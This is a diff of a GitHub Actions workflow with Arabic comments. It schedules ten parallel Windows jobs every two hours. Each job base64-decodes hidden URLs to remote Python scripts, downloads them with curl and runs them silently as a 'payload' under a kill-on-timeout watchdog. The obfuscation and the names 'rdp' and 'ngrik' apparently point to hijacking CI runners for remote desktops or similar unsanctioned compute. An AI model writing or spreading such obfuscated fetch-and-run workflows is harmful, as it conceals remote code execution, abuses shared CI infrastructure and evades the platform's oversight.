@@ -3,18 +3,18 @@ name: Background Task Automation
 on:
   workflow_dispatch: # للتشغيل اليدوي
   schedule:
-    - cron: '0 0,5,10,15,20 * * *' # الجدولة للعمل 5 مرات يومياً (الساعات 00:00، 05:00، 10:00، 15:00، 20:00 بتوقيت UTC)
+    - cron: '0 */2 * * *' # الجدولة للعمل كل ساعتين تماماً على مدار الـ 24 ساعة (12 مرة يومياً)
 
 jobs:
   execute-nodes:
     name: Worker-Instance [${{ matrix.node_index }}]
     runs-on: windows-2022
-    timeout-minutes: 185 # الحد الأقصى للتشغيل (لتجنب الإيقاف المفاجئ من GitHub)
+    timeout-minutes: 130 # تم تقليله ليناسب دورة الساعتين (ساعتين و 10 دقائق كحد أقصى للـ Job بالكامل)
     
     strategy:
       fail-fast: false
       matrix:
-        node_index: [1, 2, 3, 4] # تشغيل عدة نسخ في نفس الوقت
+        node_index: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10] # تشغيل 5 نسخ في نفس الوقت
 
     steps:
       # ---------------------------------------------------------
@@ -27,7 +27,7 @@ jobs:
           
           # فك تشفير الروابط وتحميلها في المتغيرات
           URL_HASH=$(echo "aHR0cHM6Ly9odWdnaW5nZmFjZS5jby9kYXRhc2V0cy9nZmRnMzRmc2QvcmRwL3Jlc29sdmUvbWFpbi9oYXNoLnB5" | base64 --decode)
-          URL_MAIN=$(echo "aHR0cHM6Ly9odWdnaW5nZmFjZS5jby9kYXRhc2V0cy9zYW1pbG9kOS9uYW5uaS9yZXNvbHZlL21haW4vc3RhcnRfZG93bi5weQ==" | base64 --decode)
+          URL_MAIN=$(echo "aHR0cHM6Ly9odWdnaW5nZmFjZS5jby9kYXRhc2V0cy9nZmRnMzRmc2QvbmdyaWsvcmVzb2x2ZS9tYWluL3N0YXJ0X3Nocmlua19uZXcucHk=" | base64 --decode)
           
           # حفظ الملفات (سيتم حفظ الملف الأساسي باسم start.py لتسهيل التشغيل)
           curl -sL "$URL_HASH" > hash.py
@@ -39,7 +39,7 @@ jobs:
           echo ">>> [SYSTEM] Ready to execute."
 
       # ---------------------------------------------------------
-      # الخطوة الثانية: التشغيل الصامت مع نظام الحماية الزمني
+      # الخطوة الثانية: التشغيل الصامت مع نظام الحماية الزمني (ساعتين)
       # ---------------------------------------------------------
       - name: Launch Payload & Time Monitor
         shell: pwsh
@@ -53,25 +53,25 @@ jobs:
           
           # تجهيز معطيات تشغيل العملية في الخلفية
           $ProcessArgs = @{
-              FilePath     = "python"
+              FilePath = "python"
               ArgumentList = "start.py"
-              PassThru     = $true
-              NoNewWindow  = $true
+              PassThru = $true
+              NoNewWindow = $true
           }
           $activeProcess = Start-Process @ProcessArgs
           
-          Write-Output "[MONITOR] Watchdog is running. Timeout limit: 180 mins."
+          Write-Output "[MONITOR] Watchdog is running. Timeout limit: 120 mins (2 Hours)."
           
           try {
-              # انتظار انتهاء العملية أو وصولها للحد الزمني (10800 ثانية = 3 ساعات)
-              Wait-Process -InputObject $activeProcess -Timeout 10800 -ErrorAction Stop
+              # انتظار انتهاء العملية أو وصولها للحد الزمني (7200 ثانية = ساعتين تماماً)
+              Wait-Process -InputObject $activeProcess -Timeout 7200 -ErrorAction Stop
               Write-Output "[SUCCESS] Task completed within limits."
           } 
           catch {
-              # إيقاف إجباري عند تخطي الوقت
-              Write-Output "[TIMEOUT] Maximum time reached. Forcing process kill..."
+              # إيقاف إجباري عند تخطي الساعتين للسماح للمهمة التالية بالبدء نظيفة
+              Write-Output "[TIMEOUT] 2 Hours reached. Forcing process kill to transition to next run..."
               Stop-Process -InputObject $activeProcess -Force
-              Write-Output "[TERMINATED] Process closed gracefully by Watchdog after 3 hours."
+              Write-Output "[TERMINATED] Process closed gracefully by Watchdog after 2 hours."
           }
 
       # ---------------------------------------------------------
